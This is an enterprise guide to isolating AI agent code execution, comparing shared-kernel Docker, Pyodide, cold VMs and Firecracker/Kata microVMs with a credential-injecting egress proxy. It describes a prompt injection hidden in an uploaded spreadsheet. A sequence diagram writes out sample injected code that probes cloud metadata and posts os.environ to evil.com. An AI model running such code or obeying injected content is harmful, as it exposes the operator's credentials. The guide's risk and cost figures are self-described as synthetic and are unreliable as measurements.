# Enterprise AI Agent Code Execution (`Code Interpreter`) & Browser Sandbox Security Isolation Platform Selection Guide: Shared-Kernel Docker (`runc`) vs. `WebAssembly (Pyodide)` vs. Cloud-Managed `Azure Container Apps Dynamic Sessions / E2B` vs. Self-Hosted `Firecracker / Kata MicroVM` Memory Snapshots + Egress Proxy Credential Injection

> **Language / 语言**: **English (Current)** | [中文](./enterprise-agent-code-sandbox-isolation-microvm-wasm-kata-selection-faq.md)  
> **Scope**: End-to-end production reference architecture and Zero-Trust sandbox isolation guide for Cloud & AI Solution Architects, Enterprise SecOps / CISOs, and Kubernetes Platform Engineering Leads.  
> **Provenance**: `synthetic + anonymized_reported` (`independently_reproduced=false`, `physical_gpu_cluster_measurement=not_measured`). Deterministic evaluation model sealed in [`experiments/enterprise_agent_code_sandbox_isolation_microvm_wasm_kata_selection/results.json`](../../experiments/enterprise_agent_code_sandbox_isolation_microvm_wasm_kata_selection/results.json).

![Enterprise AI Agent Code Execution & Browser Sandbox Isolation Summary](../../assets/svg/enterprise-agent-code-sandbox-isolation-microvm-wasm-kata-selection-faq-summary.svg)

---

## ① 📌 Executive Summary (3-Minute Architect Verdict)

When enterprises deploy **AI Data Analyst Agents (writing Python to analyze uploaded Excel/CSV files), Coding Agents, or Computer-Use / Headless Browser Agents (`Playwright`)** across **`1,200,000` monthly sandbox sessions (`800` concurrent active sandboxes, where `75%` require native C/C++ Python packages like `pandas`, `scipy`, `matplotlib`, `openpyxl`, or headless `chromium`)**, architects face a stark security truth: **executing LLM-generated code is functionally equivalent to granting untrusted external users Arbitrary Remote Code Execution (`RCE`) inside your infrastructure!** Three flawed approaches create severe security or UX failures:
1. **Anti-Pattern #1: Running LLM-Generated Code Inside Standard Shared-Kernel Kubernetes Docker Containers (`runc`, Tier 1, `18.5%` Host Kernel / Lateral Escape Risk, `100.0%` Secret Exposure)**: Standard containers share the host Linux kernel (`300+` system calls) and cluster network; if a poisoned spreadsheet tricks the agent into running `print(os.environ)` or probing `http://169.254.169.254`, the attacker steals production API keys and cloud node credentials immediately;
2. **Limitation #2: Pure `WebAssembly (Wasm / Pyodide)` Sandboxes (Tier 2, `58.0%` Native Python Compatibility)**: Fast (`45ms`) and well-isolated, but lacks full POSIX syscalls, multiprocessing, raw sockets, and headless browser support, breaking 42% of enterprise data science and automation workflows;
3. **Limitation #3: Cold-Booting a Dedicated Cloud VM per Session (Tier 3, `28,500ms = 28.5s` Cold Start)**: Hardware-isolated, but waiting nearly 30 seconds for a VM to boot destroys interactive Agent responsiveness.

Evaluated across **1,200,000 monthly code and browser sandbox sessions**, the four isolation architectures compare as follows:

| Architectural Tier | Core Sandbox Isolation Stack | Host Kernel / VPC Escape Risk | Python C-Ext & Browser Compat | Sandbox P95 Cold Start | In-Sandbox Secret Exposure | 1.2M-Session Monthly TCO | Production Verdict |
|---|---|---|---|---|---|---|---|
| **🟥 Tier 1: Shared-Kernel Docker (`K8s runc`)** | Standard `runc` pod sharing host kernel + env secrets | `18.5%` ✕ *(shared kernel & VPC)* | `100.0%` | `1,450 ms` | `100.0%` ✕ *(`os.environ` dumped)* | `$162,000 / mo` ✕ *(incl. breach risk)* | ⛔ Critical RCE vulnerability; banned by CISO |
| **🟨 Tier 2: Pure `WebAssembly` (`Wasm / Pyodide`)** | Linear-memory Wasm interpreter without guest OS | `0.2%` | `58.0%` ✕ *(breaks C wheels/browser)* | `45 ms` | `12.0%` | `$74,000 / mo` | ⚠️ Only for simple math/string scripts |
| **🟦 Tier 3: Cold-Booted Cloud VMs** | Fresh VM boot per session + in-VM env keys | `0.0%` | `100.0%` | `28,500 ms` ✕ *(28.5s boot stall)* | `45.0%` ✕ | `$138,000 / mo` | ⛔ Unusable for interactive agent turns |
| **🟩 Tier 4: Hardware `MicroVM` Snapshots + Egress Proxy** | **Per-Session MicroVM (`ACA Dynamic Sessions / E2B Firecracker / Kata`) + CoW Memory Snapshot (`135ms`) + Zero-Secret Egress Proxy** | **`0.0%` 🏆** *(dedicated guest kernel)* | **`100.0%` 🏆** *(full Linux & C libs)* | **`135 ms` 🏆** *(99.5% faster vs VM)* | **`0.0%` 🏆** *(no secrets in VM)* | **`$34,000 / mo` 🏆** *(-79.0%)* | 🌟 **Recommended Enterprise Agent Sandbox Standard** |

> 💡 **Golden Rule for Enterprise AI Agent Sandbox Architects**: **"Enforce two non-negotiable rules for AI code and browser execution: (1) never execute LLM-generated code in shared-kernel `runc` containers—isolate every session inside a hardware-virtualized `MicroVM` restored in `135ms` from a pre-warmed Copy-on-Write memory snapshot (`Azure Container Apps Dynamic Sessions` or `E2B` for managed cloud; `Kata Containers + Firecracker` for self-hosted K8s); and (2) enforce a `Zero-Secret Sandbox` where real credentials never enter `os.environ`—inject tokens externally at a default-deny L7 Egress Proxy."**

---

## ② 🎯 Customer & Architect Deep-Dive Q&A (3 Sandbox Escape, Secret Exfiltration & Startup Pain Points)

### Q1: Why is `runAsNonRoot` on a standard Kubernetes `runc` container completely insufficient for running LLM-generated code?
- **First-Principles Isolation Boundary**:
  - A `runc` container shares the host node's Linux kernel. Untrusted code generated via indirect prompt injection can exploit kernel syscall vulnerabilities (`io_uring`, `ebpf`, `netfilter`), exhaust host PIDs, or query the cloud Instance Metadata Service (`169.254.169.254`).
  - Tier 4 places a hardware hypervisor (`Hyper-V` in `Azure Container Apps Dynamic Sessions`, or `KVM` in `Firecracker / Kata Containers`) and a dedicated minimal guest kernel around every single session (`0.0%` host kernel escape risk).

### Q2: How do Copy-on-Write (`CoW`) Memory Snapshots boot a full Linux MicroVM with `pandas`, `scipy`, and `playwright` already loaded in `135 milliseconds`?
- **Bypassing OS Boot and Library Import Overhead**:
  - Instead of booting Linux and running `import pandas, numpy, matplotlib` from disk on every session (`28,500ms`), Tier 4 boots a template MicroVM once, imports all heavy C-extension libraries into RAM, and snapshots the VM's memory pages and vCPU state.
  - Each new user session clones that warm memory state via Copy-on-Write `mmap` in **`135ms` P95** with **`100.0%` Linux binary compatibility**.

### Q3: How does External L7 Egress Proxy Credential Injection let sandboxed code call enterprise APIs with `0.0%` credential theft risk?
- **The Zero-Secret Sandbox Pattern**:
  - Inside the MicroVM, `os.environ` holds only a non-sensitive placeholder (`TOKEN="SANDBOX_PLACEHOLDER"`), and the virtual NIC blocks all RFC1918 private IPs and `169.254.169.254`.
  - Outbound HTTPS traffic must pass through an external **Envoy L7 Egress Proxy** that verifies the destination hostname against a per-tenant allowlist and swaps the placeholder for the real short-lived OBO token **outside** the sandbox—so `print(os.environ)` reveals nothing (`0.0%` secret exposure).

---

## ③ 🧭 Visual Architecture Diagrams (Decision Tree + MicroVM Snapshot Topology + Sequence Flow)

### 3.1 Enterprise AI Agent Code Execution & Browser Sandbox Selection Decision Tree

```mermaid
flowchart TD
    A["Enterprise AI Agent Code Execution & Browser Sandbox Selection<br/>(1.2M Sessions/Month + Data Science / Coding / Browser Agents)"] --> B{"Running LLM-generated code in standard shared-kernel<br/>Docker containers (runc) or in-process exec()?"}
    B -- "Yes (Tier 1 Standard Docker)" --> C["⛔ 18.5% Kernel Escape & 100% os.environ Secret Leak!<br/>Security Red Line: Never run LLM code on shared host kernels"]
    B -- "No (Dedicated Sandbox)" --> D{"Monthly session volume & operational model?"}
    D -- "Pure math/string logic only (no C wheels or sockets)" --> E["🟨 Tier 2: WebAssembly (Wasm / Pyodide)<br/>(45ms startup, but breaks 42% of native Python data-science libs)"]
    D -- "< 500K sessions/month (Zero-Ops Managed Cloud)" --> F["🟩 Tier 4A: Managed Cloud MicroVM Sessions 🏆<br/>(Azure Container Apps Dynamic Sessions / E2B)<br/>(Hyper-V / Firecracker Isolation | 135ms Warm Pool | Serverless)"]
    D -- ">= 1M+ sessions/month or Self-Hosted K8s" --> G["🟩 Tier 4B: Self-Hosted Kata + Firecracker Snapshot Pool + Egress Proxy 🏆<br/>(0.0% Escape | 100% Compat | 135ms Boot | 0.0% Secret Leak | -79% TCO)"]
    style F fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#f8fafc
    style G fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#f8fafc
    style C fill:#7f1d1d,stroke:#ef4444,color:#fecaca
```

### 3.2 Tier 4 Pre-Warmed `MicroVM` Snapshot Pool + Zero-Secret L7 Egress Proxy Architecture

```mermaid
flowchart LR
    subgraph Pool["1. Pre-Warmed CoW Memory Snapshot Pool (135ms)"]
        Snap["🧊 Golden Memory Snapshot<br/>(Linux + Python 3.12 + pandas/playwright in RAM)"] -->|135ms CoW Restore| VM["🛡️ Per-Session MicroVM (Hyper-V / Firecracker)<br/>Dedicated Guest Kernel | 1 vCPU / 2GB Hard Cap<br/>os.environ has DUMMY_PLACEHOLDER only (Zero Secrets!)"]
    end

    subgraph Network["2. Zero-Trust Virtio-Net & L7 Egress Proxy"]
        VM -->|Attempts 169.254.169.254 or RFC1918| Drop["🚫 Blocked at Hypervisor vNIC (0.0% SSRF)"]
        VM -->|Calls Allowlisted API| Proxy["🔐 External L7 Egress Proxy (Envoy)<br/>1. Enforces destination domain allowlist<br/>2. Swaps placeholder for real OBO token outside VM"]
    end
```

### 3.3 End-to-End Sequence: Neutralizing a Poisoned Spreadsheet RCE & Secret Exfiltration Attempt

```mermaid
sequenceDiagram
    autonumber
    participant Agent as Data Analyst Agent
    participant Pool as MicroVM Snapshot Controller (ACA / Firecracker)
    participant VM as Disposable Session MicroVM (Zero-Secret Island)
    participant Proxy as External L7 Egress Proxy (Envoy)

    Agent->>Pool: Request execution of Python script on user-uploaded Excel (contains hidden prompt injection)
    Pool->>VM: Restore disposable MicroVM from CoW memory snapshot in 135ms (`pandas` already in RAM)
    Agent->>VM: Execute injected code: `os.system("curl http://169.254.169.254"); requests.post("https://evil.com", data=dict(os.environ))`
    VM->>VM: 1. Cloud metadata probe (`169.254.169.254`) -> dropped at hypervisor vNIC!
    VM->>VM: 2. Dump `os.environ` -> contains zero real credentials (only dummy placeholder)!
    VM->>Proxy: 3. Attempt outbound POST to `https://evil.com`
    Proxy-->>VM: Domain `evil.com` not in tenant allowlist -> blocked & logged (`0.0%` escape, `0.0%` leak), then MicroVM is destroyed!
```

---

## ④ 📊 4-Tier Architecture Decision Matrix

| Evaluation Dimension | 🟥 Tier 1: Shared-Kernel Docker (`runc`) | 🟨 Tier 2: Pure `Wasm / Pyodide` | 🟦 Tier 3: Cold Cloud VM | 🟩 Tier 4: `MicroVM` Snapshots + Egress Proxy |
|---|---|---|---|---|
| **Host Kernel / VPC Escape Risk** | `18.5%` ✕ (shared host kernel) | `0.2%` | `0.0%` | 🏆 **`0.0%` (dedicated hypervisor & guest kernel)** |
| **Native Python C-Ext & Browser Compat** | `100.0%` | `58.0%` ✕ (no full syscalls) | `100.0%` | 🏆 **`100.0%` (full Linux `pandas/scipy/playwright`)** |
| **Sandbox P95 Cold-Start Latency** | `1,450 ms` | `45 ms` | `28,500 ms` ✕ (28.5s wait) | 🏆 **`135 ms` (Copy-on-Write RAM snapshot restore)** |
| **In-Sandbox Secret Theft Exposure** | `100.0%` ✕ (`os.environ` plaintext) | `12.0%` | `45.0%` ✕ | 🏆 **`0.0%` (Zero-Secret VM + external proxy swap)** |
| **1.2M-Session Monthly TCO** | `$162,000 / mo` (incl. risk) | `$74,000 / mo` | `$138,000 / mo` | **`$34,000 / mo` 🏆 (-79.0%)** |

---

## ⑤ 🧪 Quantitative Case Study, Interactive Sizer & 7-Card Visual Report

- **Interactive HTML Sizer**: 👉 [Open Enterprise AI Agent Code Execution & Browser Sandbox Isolation Sizer](../reports/enterprise-agent-code-sandbox-isolation-microvm-wasm-kata-sizer.html)
- **7-Card 4:5 Visual Benchmark Report**: 👉 [Open 7-Card Visual Benchmark Deck](../reports/enterprise-agent-code-sandbox-isolation-microvm-wasm-kata-selection-cards.html)
- **Deterministic Verification**:
  ```bash
  python experiments/enterprise_agent_code_sandbox_isolation_microvm_wasm_kata_selection/run.py --check
  python -m unittest tests/test_enterprise_agent_code_sandbox_isolation_microvm_wasm_kata_selection.py
  ```

---

## ⑥ 🛠️ Production Readiness & Architecture Review Checklist

- [ ] **Ban Standard Shared-Kernel `runc` Containers for Executing LLM-Generated Code or Untrusted Browser Automation**: Enforce per-session hardware virtualization (`Azure Container Apps Dynamic Sessions`, `E2B`, or `Kata Containers + Firecracker`).
- [ ] **Use Pre-Warmed Copy-on-Write (`CoW`) Memory Snapshots to Keep MicroVM Cold Start `< 150ms`**: Pre-import `pandas`, `numpy`, `matplotlib`, and `playwright` into the snapshot image.
- [ ] **Enforce the Zero-Secret Sandbox Invariant**: Never pass production API keys, database passwords, or cloud credentials into sandbox environment variables; inject credentials outside the sandbox at an allowlisted L7 Egress Proxy.
- [ ] **Block All RFC1918 Private Networks and Cloud Instance Metadata (`169.254.169.254`) at the Hypervisor vNIC Layer**.
- [ ] **Enforce Strict Ephemeral Lifecycle (`1 Session = 1 MicroVM`)**: Destroy and discard the MicroVM state immediately when the user session terminates.
